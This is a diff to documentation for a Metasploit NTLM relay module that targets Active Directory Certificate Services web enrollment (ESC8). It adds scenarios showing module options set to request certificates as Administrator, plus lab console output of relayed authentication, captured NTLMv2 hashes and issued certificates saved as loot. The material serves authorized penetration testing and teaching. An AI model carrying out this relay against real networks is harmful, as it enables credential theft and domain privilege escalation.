@@ -33,9 +33,60 @@ The template to issue if MODE is SPECIFIC_TEMPLATE.
 
 ## Scenarios
 
-### Version and OS
+### NTLM
 
 ```
+msf auxiliary(server/relay/esc8) > show options
+
+Module options (auxiliary/server/relay/esc8):
+
+   Name           Current Setting            Required  Description
+   ----           ---------------            --------  -----------
+   ALT_DNS                                   no        Alternative certificate DNS
+   ALT_SID                                   no        Alternative object SID
+   ALT_UPN        Administrator@example.com  no        Alternative certificate UPN (format: USER@DOMAIN)
+   CAINPWFILE                                no        Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can
+                                                       be a path.
+   JOHNPWFILE                                no        Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 ha
+                                                       shes, each of which is stored in separate files. Can also be a path.
+   MODE           SPECIFIC_TEMPLATE          yes       The issue mode. (Accepted: ALL, AUTO, QUERY_ONLY, SPECIFIC_TEMPLATE)
+   ON_BEHALF_OF                              no        Username to request on behalf of (format: DOMAIN\USER)
+   PFX                                       no        Certificate to request on behalf of
+   Proxies                                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported prox
+                                                       ies: socks5h, sapni, socks4, http, socks5
+   RELAY_TIMEOUT  25                         yes       Seconds that the relay socket will wait for a response after the client has
+                                                       initiated communication.
+   RHOSTS         10.5.132.180               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
+                                                       sics/using-metasploit.html
+   RPORT          80                         yes       The target port (TCP)
+   SMBDomain      WORKGROUP                  yes       The domain name used during SMB exchange.
+   SRVHOST        0.0.0.0                    yes       The local host or network interface to listen on. This must be an address on
+                                                        the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT        445                        yes       The local port to listen on.
+   SRV_TIMEOUT    25                         yes       Seconds that the server socket will wait for a response after the client has
+                                                        initiated communication.
+   SSL            false                      no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI      /certsrv/                  yes       The URI for the cert server.
+   VHOST                                     no        HTTP server virtual host
+
+
+   When MODE is SPECIFIC_TEMPLATE:
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   CERT_TEMPLATE  ESC1-Template    no        The template to issue if MODE is SPECIFIC_TEMPLATE.
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Relay  Run SMB ESC8 relay server
+
+
+
+View the full module info with the info, or info -d command.
+
 msf auxiliary(server/relay/esc8) > run
 [*] Auxiliary module running as background job 1.
 msf auxiliary(server/relay/esc8) > 
@@ -62,4 +113,158 @@ msf auxiliary(server/relay/esc8) >
 [*] New request from 192.168.159.129
 [*] Received request for MSFLAB\smcintyre
 [*] Identity: MSFLAB\smcintyre - All targets relayed to
+```
+
+
+### NTLM and ESC1
+
+```
+msf auxiliary(server/relay/esc8) > show options
+
+Module options (auxiliary/server/relay/esc8):
+
+   Name           Current Setting            Required  Description
+   ----           ---------------            --------  -----------
+   ALT_DNS                                   no        Alternative certificate DNS
+   ALT_SID                                   no        Alternative object SID
+   ALT_UPN        Administrator@example.com  no        Alternative certificate UPN (format: USER@DOMAIN)
+   CAINPWFILE                                no        Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can
+                                                       be a path.
+   JOHNPWFILE                                no        Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 ha
+                                                       shes, each of which is stored in separate files. Can also be a path.
+   MODE           SPECIFIC_TEMPLATE          yes       The issue mode. (Accepted: ALL, AUTO, QUERY_ONLY, SPECIFIC_TEMPLATE)
+   ON_BEHALF_OF                              no        Username to request on behalf of (format: DOMAIN\USER)
+   PFX                                       no        Certificate to request on behalf of
+   Proxies                                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported prox
+                                                       ies: socks5h, sapni, socks4, http, socks5
+   RELAY_TIMEOUT  25                         yes       Seconds that the relay socket will wait for a response after the client has
+                                                       initiated communication.
+   RHOSTS         10.5.132.180               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
+                                                       sics/using-metasploit.html
+   RPORT          80                         yes       The target port (TCP)
+   SMBDomain      WORKGROUP                  yes       The domain name used during SMB exchange.
+   SRVHOST        0.0.0.0                    yes       The local host or network interface to listen on. This must be an address on
+                                                        the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT        445                        yes       The local port to listen on.
+   SRV_TIMEOUT    25                         yes       Seconds that the server socket will wait for a response after the client has
+                                                        initiated communication.
+   SSL            false                      no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI      /certsrv/                  yes       The URI for the cert server.
+   VHOST                                     no        HTTP server virtual host
+
+
+   When MODE is SPECIFIC_TEMPLATE:
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   CERT_TEMPLATE  ESC1-Template    no        The template to issue if MODE is SPECIFIC_TEMPLATE.
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Relay  Run SMB ESC8 relay server
+
+
+
+View the full module info with the info, or info -d command.
+
+msf auxiliary(server/relay/esc8) > run
+[*] Auxiliary module running as background job 0.
+msf auxiliary(server/relay/esc8) > 
+[*] SMB Server is running. Listening on 0.0.0.0:445
+[*] Server started.
+[*] New request from 10.5.132.122
+[*] Received request for \msfuser
+[*] Relaying to next target http://10.5.132.180:80/certsrv/
+[+] Identity: \msfuser - Successfully authenticated against relay target http://10.5.132.180:80/certsrv/
+[SMB] NTLMv2-SSP Client     : 10.5.132.180
+[SMB] NTLMv2-SSP Username   : \msfuser
+[SMB] NTLMv2-SSP Hash       : msfuser:::af0b69bf0b95c55e:db5ce84b2f41b82d7df93bd2566c06b6:0101000000000000cbf836e63587dc013ce37255fbca75410000000002000e004500580041004d0050004c00450001001e00570049004e002d00440052004300390048004300440049004d0041005400040016006500780061006d0070006c0065002e0063006f006d0003003600570049004e002d00440052004300390048004300440049004d00410054002e006500780061006d0070006c0065002e0063006f006d00050016006500780061006d0070006c0065002e0063006f006d0007000800cbf836e63587dc01060004000200000008003000300000000000000000000000003000002ad3656a59fe53f773d5bc3852373338e1f3270cdbdf9411b84ef184151925510a001000000000000000000000000000000000000900220063006900660073002f00310030002e0035002e003100330035002e003200300031000000000000000000
+
+[+] Certificate generated using template ESC1-Template and \msfuser
+[+] Certificate for \msfuser using template ESC1-Template saved to /home/tmoose/.msf4/loot/20260116161729_default_10.5.132.180_windows.ad.cs_994769.pfx
+[*] Received request for \msfuser
+[*] Identity: \msfuser - All targets relayed to
+
+```
+
+### NTLM and ESC2
+```msf
+msf auxiliary(server/relay/esc8) > show options
+
+Module options (auxiliary/server/relay/esc8):
+
+   Name           Current Setting                       Required  Description
+   ----           ---------------                       --------  -----------
+   ALT_DNS                                              no        Alternative certificate DNS
+   ALT_SID                                              no        Alternative object SID
+   ALT_UPN                                              no        Alternative certificate UPN (format: USER@DOMAIN)
+   CAINPWFILE                                           no        Name of file to store Cain&Abel hashes in. Only supports NTLMv1 h
+                                                                  ashes. Can be a path.
+   JOHNPWFILE                                           no        Name of file to store JohnTheRipper hashes in. Supports NTLMv1 an
+                                                                  d NTLMv2 hashes, each of which is stored in separate files. Can a
+                                                                  lso be a path.
+   MODE           SPECIFIC_TEMPLATE                     yes       The issue mode. (Accepted: ALL, AUTO, QUERY_ONLY, SPECIFIC_TEMPLA
+                                                                  TE)
+   ON_BEHALF_OF   EXAMPLE\Administrator                 no        Username to request on behalf of (format: DOMAIN\USER)
+   PFX            /home/tmoose/.msf4/loot/202601161509  no        Certificate to request on behalf of
+                  11_default_10.5.132.180_windows.ad.c
+                  s_854591.pfx
+   Proxies                                              no        A proxy chain of format type:host:port[,type:host:port][...]. Sup
+                                                                  ported proxies: socks5h, sapni, socks4, http, socks5
+   RELAY_TIMEOUT  25                                    yes       Seconds that the relay socket will wait for a response after the
+                                                                  client has initiated communication.
+   RHOSTS         10.5.132.180                          yes       The target host(s), see https://docs.metasploit.com/docs/using-me
+                                                                  tasploit/basics/using-metasploit.html
+   RPORT          80                                    yes       The target port (TCP)
+   SMBDomain      WORKGROUP                             yes       The domain name used during SMB exchange.
+   SRVHOST        0.0.0.0                               yes       The local host or network interface to listen on. This must be an
+                                                                   address on the local machine or 0.0.0.0 to listen on all address
+                                                                  es.
+   SRVPORT        445                                   yes       The local port to listen on.
+   SRV_TIMEOUT    25                                    yes       Seconds that the server socket will wait for a response after the
+                                                                   client has initiated communication.
+   SSL            false                                 no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI      /certsrv/                             yes       The URI for the cert server.
+   VHOST                                                no        HTTP server virtual host
+
+
+   When MODE is SPECIFIC_TEMPLATE:
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   CERT_TEMPLATE  User             no        The template to issue if MODE is SPECIFIC_TEMPLATE.
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Relay  Run SMB ESC8 relay server
+
+
+
+View the full module info with the info, or info -d command.
+
+msf auxiliary(server/relay/esc8) > run
+[*] Auxiliary module running as background job 0.
+msf auxiliary(server/relay/esc8) > 
+[*] SMB Server is running. Listening on 0.0.0.0:445
+[*] Server started.
+[*] New request from 10.5.132.122
+[*] Received request for \msfuser
+[*] Relaying to next target http://10.5.132.180:80/certsrv/
+[+] Identity: \msfuser - Successfully authenticated against relay target http://10.5.132.180:80/certsrv/
+[SMB] NTLMv2-SSP Client     : 10.5.132.180
+[SMB] NTLMv2-SSP Username   : \msfuser
+[SMB] NTLMv2-SSP Hash       : msfuser:::916940a20e939a34:7f5150c74cba44513fcb2e7ed28e8f45:0101000000000000bf1765b93787dc01c7c75e835e16b4ad0000000002000e004500580041004d0050004c00450001001e00570049004e002d00440052004300390048004300440049004d0041005400040016006500780061006d0070006c0065002e0063006f006d0003003600570049004e002d00440052004300390048004300440049004d00410054002e006500780061006d0070006c0065002e0063006f006d00050016006500780061006d0070006c0065002e0063006f006d0007000800bf1765b93787dc01060004000200000008003000300000000000000000000000003000002ad3656a59fe53f773d5bc3852373338e1f3270cdbdf9411b84ef184151925510a001000000000000000000000000000000000000900220063006900660073002f00310030002e0035002e003100330035002e003200300031000000000000000000
+
+[+] Certificate generated using template User and \msfuser
+[+] Certificate for \msfuser using template User saved to /home/tmoose/.msf4/loot/20260116163102_default_10.5.132.180_windows.ad.cs_883392.pfx
+[*] Received request for \msfuser
+[*] Identity: \msfuser - All targets relayed to
+
+
 ```
